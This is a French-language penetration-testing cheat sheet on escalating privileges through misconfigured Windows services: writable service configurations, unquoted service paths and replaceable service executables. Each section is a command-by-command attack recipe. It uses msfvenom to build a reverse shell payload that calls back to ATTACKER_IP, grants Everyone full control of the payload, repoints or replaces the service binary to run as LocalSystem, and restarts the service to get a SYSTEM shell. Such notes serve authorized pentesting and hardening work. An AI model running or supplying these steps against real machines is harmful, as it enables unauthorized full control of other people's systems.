# Services Permissions
Il est peu probable que les services Windows de base soient vulnérables à quoi que ce soit - les services installés par l'utilisateur sont beaucoup plus susceptibles d'avoir des trous.

Rechercher des services autres que ceux par défaut

```sh
wmic service get Name, DisplayName, PathName, StartMode | findstr /v /i "C:\Windows"
```

## Binary Paths (Insecure Service Permissions)

Si la DACL du service (et non la DACL exécutable du service) vous permet de modifier la configuration d'un service, vous pourrez reconfigurer le service. Cela vous permettra de pointer vers n'importe quel exécutable dont vous avez besoin et de l'exécuter avec n'importe quel compte de votre choix, y compris **SYSTEM** lui-même.

Vérifier les services avec une DACL accecible en ecriture

```sh
accesschk64.exe -uwcv Everyone *
# check: RW service_name
#				SERVICE_CHANGE_CONFIG
```

Vérifier la DACL d'un service

```sh
accesschk64.exe -uwcv <SERVICE_NAME>
accesschk64.exe -qlc <SERVICE_NAME>
# check RW BUILTIN\USER : SERVICE_ALL_ACCESS
# 		RW Everyone 	: SERVICE_CHANGE_CONFIG
```

Afficher la configuration du service

```sh
sc qc <SERVICE_NAME>
# check: 
#	BINARY_PATH_NAME (Le chemin d'executable du fichier) 
# 	SERVICE_START_NAME (le compte utilisé pour exécuter le service)
```

Génerer un payload et l'écouteur

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 -f exe-service -o payload.exe
```

Autoriser tout le monde a exécuter le payload

```sh
icacls C:\Temp\payload.exe /grant Everyone:F
```

Modifier l'exécutable et le compte associés au service

```sh
sc config <SERVICE_NAME> binPath="C:\Temp\payload.exe" obj=LocalSystem
```

Redémarrer le service et obtenir un shell

```sh
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```

## Unquoted Service Paths

Lorsque qu'un service est configuré pour pointer vers un exécutable **«non cité (sans guillemets)»** il est possible de l'exploiter

> Si un attaquant crée l'un des exécutables recherchés avant l'exécutable du service attendu, il peut forcer le service à exécuter un exécutable arbitraire.

Afficher la configuration du service

```sh
sc qc <SERVICE_NAME>
# check: 
#	BINARY_PATH_NAME (Le chemin d'executable du fichier) 
# 	SERVICE_START_NAME (le compte utilisé pour exécuter le service)
```

Vérifier les autorisations sur les dossier de l'exécutable

```sh
icacls <BINARY_PATH_NAME>
# check: BUILTIN\Users:(AD) (WD)
```

Génerer un payload et l'écouteur

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 -f exe-service -o payload.exe
```

Placer le payload dans le chemin vulnerable

```sh
move payload.exe C:\MyPrograms\Disk.exe 
```

Autoriser tout le monde a exécuter le payload

```sh
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

Redémarrer le service et obtenir un shell

```sh
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```

## Insecure Permissions on Service Executable 

Si l'exécutable associé à un service dispose de faibles autorisations permettant à un attaquant de le modifier ou de le remplacer, l'attaquant peut obtenir trivialement les privilèges du compte du service.

Afficher la configuration du service

```sh
sc qc <SERVICE_NAME>
# check: 
#	BINARY_PATH_NAME (Le chemin d'executable du fichier) 
# 	SERVICE_START_NAME (le compte utilisé pour exécuter le service)
```

Vérifier les autorisations sur l'exécutable

```sh
icacls <BINARY_PATH_NAME>
# check: Everyone:(M)
```

Génerer un payload et l'écouteur.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 -f exe-service -o payload.exe
```

Une fois le payload sur le serveur Windows, nous procédons au remplacement de l'exécutable du service par notre charge utile.

```sh
cd C:\..\Service-path\

move SERVICE_NAME.exe SERVICE_NAME.exe.bkp

# Ici la charge utile portera le meme nom que le SERVICE vulnerable
move c:\temp\payload.exe SERVICE_NAME.exe
```

Autoriser tout le monde a exécuter le payload

```sh
icacls SERVICE_NAME.exe /grant Everyone:F
```

Redémarrer le service et obtenir un shell

```sh
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```